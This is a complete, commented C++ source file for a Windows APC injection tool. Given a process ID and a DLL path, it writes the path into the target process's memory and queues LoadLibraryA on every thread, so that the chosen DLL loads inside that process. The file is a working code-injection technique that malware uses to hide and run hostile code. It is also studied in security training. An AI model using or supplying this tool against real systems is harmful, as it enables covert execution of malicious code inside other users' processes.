// Using UNICODE macro to set all functions to use the "W" version
#define UNICODE

#include <Windows.h>
#include <TlHelp32.h>
#include <cstdio>
#include <cstdlib>
#include <vector>

using namespace std;

// Error wrapper that shows a string and an error code using GetLastError()
int Error(const char *msg) {
    printf("%s (%lu)", msg, GetLastError());
    return EXIT_FAILURE;
}

// Function for getting all threads in the target process
vector<DWORD> GetProcessThreads(DWORD pid) {
    vector<DWORD> tids;

    auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return tids;

    THREADENTRY32 te = { sizeof(te) };
    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tids.push_back(te.th32ThreadID);
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return tids;
}

int main(int argc, const char *argv[]) {
    // Simple char pointer for strtol function
    char *p;

    // Explaining user how to run the program
    if (argc < 3) {
        printf("Usage: apc <pid> <dllpath>\n");
        return EXIT_SUCCESS;
    }

    // Getting process id
    int pid = strtol(argv[1], &p, 10);

    // Opening a handle to the process
    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
    if (!hProcess)
        return Error("Unable to open a handle to the target process!\n");

    // Allocating memory in the target process for future .dll injection
    void *buffer = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer)
        return Error("Failed to allocate memory in the target process!\n");

    // Writing .dll to the target process memory
    if (!WriteProcessMemory(hProcess, buffer, argv[2], strlen(argv[2]), nullptr))
        return Error("Failed to write .dll in the target process memory!\n");

    // Getting all threads of the target process
    auto tids = GetProcessThreads(pid);
    if (tids.empty()) {
        return Error("Failed to locate threads in the target process!\n");
    }

    // APC Injection (queuing UserAPC for every thread)
    for (const DWORD tid : tids) {
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
        if (hThread) {
            QueueUserAPC((PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryA"),
                         hThread, (ULONG_PTR)buffer);
            CloseHandle(hThread);
        }
    }
    printf("APC sent!\n");

    // Politely closing the handle
    CloseHandle(hProcess);

    return EXIT_SUCCESS;
}